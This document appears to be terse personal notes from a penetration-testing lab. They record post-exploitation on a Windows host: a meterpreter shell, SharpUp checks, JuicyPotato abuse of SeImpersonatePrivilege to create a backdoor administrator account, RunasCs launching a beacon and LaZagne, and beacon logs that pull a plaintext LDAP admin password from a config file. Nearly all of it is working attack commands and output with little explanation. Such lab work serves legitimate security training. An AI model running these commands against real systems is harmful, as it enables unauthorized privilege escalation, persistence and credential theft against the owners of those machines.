
```
meterpreter > shell
Process 2616 created.
Channel 10 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>cd c:\tools
cd c:\tools

c:\tools>.\sharpup.exe audit
.\sharpup.exe audit

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.

=== Abusable Token Privileges ===                                                                                                                                                                                                            
        SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED           bro what? maybe UAC?                                                                                                                                              
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                             
[*] Completed Privesc Checks in 1 seconds                                                                                                                                                                                                    
                                                                                                                                                                                                                                             
```




```
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net user sawyer Password123! /add" -t *  -c
{69F9CB25-25E2-4BE1-AB8F-07AA7CB535E8}


.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net user sawyer Password123! /add" -t *  -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
.\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators sawyer /add" -t *  -c {5B3E6773-3A99-4A3D-8096-7765DD11785C} this one works idfk why

```



```
Invoke-RunasCs sawyer Password123! "cmd /c type C:\users\administrator\desktop\flag.txt" -LogonType 8
```


```
Invoke-RunasCs sawyer Password123! "cmd /c 'tree /a /f C:\users\'" -LogonType 8
```


```
Invoke-RunasCs sawyer Password123! 'cmd.exe' '/c start "" /b "C:\Tools\bacon.exe"' -LogonType 8
Invoke-RunasCs sawyer Password123! "cmd /c start /b C:\tools\bacon.exe" -LogonType 8
```



```
Invoke-RunasCs sawyer Password123! "cmd /c start /b C:\tools\Lazagne.exe all" -LogonType 8
```


```
Invoke-RunasCs sawyer Password123! "cmd.exe /c where /r C:\ credentials.txt" -LogonType 8
```

```
Invoke-RunasCs sawyer Password123! "cmd.exe /c dir C:\credentials.txt /s /b" -LogonType 8
```


getting ldapadmin credentials

```python
[05/11 18:10:15] beacon> run powershell -Command "Get-ChildItem -Path C:\ -Recurse -Include *.xml,*.ini,*.txt,*.vnc,*.rdp -ErrorAction SilentlyContinue | Select-String -Pattern 'ldapadmin' | Select-Object -ExpandProperty Path -Unique"
[05/11 18:10:15] [*] Tasked beacon to run: powershell -Command "Get-ChildItem -Path C:\ -Recurse -Include *.xml,*.ini,*.txt,*.vnc,*.rdp -ErrorAction SilentlyContinue | Select-String -Pattern 'ldapadmin' | Select-Object -ExpandProperty Path -Unique"
[05/11 18:10:16] [+] host called home, sent: 223 bytes
[05/11 18:10:33] [+] received output:
C:\Users\Administrator\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml

C:\Users\Administrator\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.ui\dialog_settings.xml

C:\Users\htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml

C:\Users\htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.ui\dialog_settings.xml

```


```python
[05/11 18:12:32] beacon> run cmd.exe /c type C:\Users\htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml
[05/11 18:12:32] [*] Tasked beacon to run: cmd.exe /c type C:\Users\htb-student\.ApacheDirectoryStudio\.metadata\.plugins\org.apache.directory.studio.connection.core\connections.xml
[05/11 18:12:32] [+] host called home, sent: 156 bytes
[05/11 18:12:33] [+] received output:
<?xml version="1.0" encoding="UTF-8"?>

<connections>
  <connection id="1d3babd3-f478-4dc3-b84a-a3efb7f73de7" name="ILFREIGHT_LDAP" host="DC01.INLANEFREIGHT.LOCAL" port="389" encryptionMethod="NONE" authMethod="SIMPLE" bindPrincipal="ldapadmin" bindPassword="car3ful_st0rinG_cr3d$" saslRealm="" saslQop="AUTH" saslSecStrenght="HIGH" saslMutualAuth="false" krb5CredentialsConf="USE_NATIVE" krb5Config="DEFAULT" krb5ConfigFile="" krb5Realm="" krb5KdcHost="" krb5KdcPort="88" readOnly="false" timeout="30000">
    <extendedProperties>
      <extendedProperty key="ldapbrowser.baseDn"/>
      <extendedProperty key="ldapbrowser.pagedSearch" value="false"/>
      <extendedProperty key="ldapbrowser.modifyModeNoEMR" value="0"/>
      <extendedProperty key="ldapbrowser.fetchSubentries" value="false"/>
      <extendedProperty key="ldapbrowser.aliasesDereferencingMethod" value="1"/>
      <extendedProperty key="ldapbrowser.manageDsaIT" value="false"/>
      <extendedProperty key="ldapbrowser.pagedSearchScrollMode" value="true"/>
      <extendedProperty key="ldapbrowser.pagedSearchSize" value="100"/>
      <extendedProperty key="ldapbrowser.fetchOperationalAttributes" value="false"/>
      <extendedProperty key="ldapbrowser.modifyMode" value="0"/>
      <extendedProperty key="ldapbrowser.timeLimit" value="0"/>
      <extendedProperty key="ldapbrowser.fetchBaseDns" value="true"/>
      <extendedProperty key="ldapbrowser.countLimit" value="1000"/>
      <extendedProperty key="ldapbrowser.referralsHandlingMethod" value="3"/>
      <extendedProperty key="ldapbrowser.modifyOrder" value="0"/>
    </extendedProperties>
  </connection>
</connections>
```